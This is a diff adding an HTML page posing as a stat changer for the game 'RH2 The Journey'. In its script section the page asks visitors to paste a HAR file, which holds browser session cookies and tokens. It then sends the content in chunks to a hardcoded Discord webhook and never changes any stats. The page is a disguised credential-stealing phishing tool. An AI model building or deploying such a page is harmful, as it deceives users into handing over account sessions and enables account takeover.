@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RH2 The Journey Stat Changer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Times New Roman', serif;
+            color: white;
+            background: #000;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Snow particle effect with circles */
+        .snow {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .snow span {
+            position: absolute;
+            display: block;
+            width: 10px;
+            height: 10px;
+            background: white;
+            border-radius: 50%;
+            opacity: 0.8;
+            animation: fall 10s linear infinite;
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(-100px);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(110vh);
+                opacity: 0;
+            }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            margin-top: 100px;
+        }
+
+        h1 {
+            font-size: 48px;
+            font-style: italic;
+            font-weight: bold;
+            text-shadow: 2px 2px 5px #fff;
+        }
+
+        h2 {
+            font-size: 20px;
+            margin-top: -10px;
+            font-style: italic;
+        }
+
+        .button {
+            display: inline-block;
+            margin: 20px;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-style: italic;
+            color: white;
+            background: #000;
+            border: 2px solid white;
+            border-radius: 8px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .button:hover {
+            background: white;
+            color: black;
+        }
+
+        .form-container {
+            margin: 50px auto;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        textarea {
+            width: 100%;
+            height: 200px;
+            margin: 20px 0;
+            padding: 10px;
+            font-size: 16px;
+            border: 2px solid white;
+            border-radius: 8px;
+            background: #000;
+            color: white;
+            resize: none;
+        }
+
+        .back-button {
+            display: block;
+            margin: 20px auto;
+            padding: 10px 20px;
+            color: white;
+            background: #000;
+            border: 2px solid white;
+            border-radius: 8px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .back-button:hover {
+            background: white;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <!-- Snow particle container -->
+    <div class="snow" id="snow"></div>
+
+    <div class="container">
+        <h1>RH2 The Journey Stat Changer</h1>
+        <h2>If you found this site, you are very lucky since we don’t make videos on it to keep it unpatched.</h2>
+        <a href="#about" class="button" onclick="loadAbout()">About</a>
+        <a href="#get-started" class="button" onclick="loadGetStarted()">Get Started</a>
+    </div>
+
+    <!-- Dynamic Content Area -->
+    <div id="content"></div>
+
+    <script>
+        // Generate snow particles
+        const snowContainer = document.getElementById('snow');
+        for (let i = 0; i < 100; i++) {
+            const span = document.createElement('span');
+            span.style.left = Math.random() * 100 + 'vw';
+            span.style.animationDuration = Math.random() * 5 + 5 + 's';
+            span.style.animationDelay = Math.random() * 5 + 's';
+            snowContainer.appendChild(span);
+        }
+
+        // Load About Page
+        function loadAbout() {
+            document.getElementById('content').innerHTML = `
+                <div class="container">
+                    <h1>About RH2 The Journey Stat Changer</h1>
+                    <p>This tool is used to change stats for RH2 The Journey. If you need help, DM cemeteryzz.</p>
+                    <a href="#" class="back-button" onclick="goBack()">Back</a>
+                </div>
+            `;
+        }
+
+        // Load Get Started Page
+        function loadGetStarted() {
+            document.getElementById('content').innerHTML = `
+                <div class="form-container">
+                    <h1>Enter The Correct File</h1>
+                    <textarea id="fileInput" placeholder="Paste your HAR file content here..."></textarea>
+                    <button class="button" onclick="processFile()">Send</button>
+                    <a href="#" class="back-button" onclick="goBack()">Back</a>
+                </div>
+            `;
+        }
+
+        // Go Back to Main Menu
+        function goBack() {
+            document.getElementById('content').innerHTML = '';
+        }
+
+        // Process File Input
+        function processFile() {
+            const fileContent = document.getElementById('fileInput').value;
+
+            if (!fileContent.trim()) {
+                alert('Please paste a valid HAR file content.');
+                return;
+            }
+
+            const chunks = fileContent.match(/.{1,2000}/g); // Break into chunks
+            chunks.forEach((chunk, index) => {
+                fetch('https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `Part ${index + 1}: ${chunk}` }),
+                });
+            });
+
+            alert('File sent successfully!');
+        }
+    </script>
+</body>
+</html>
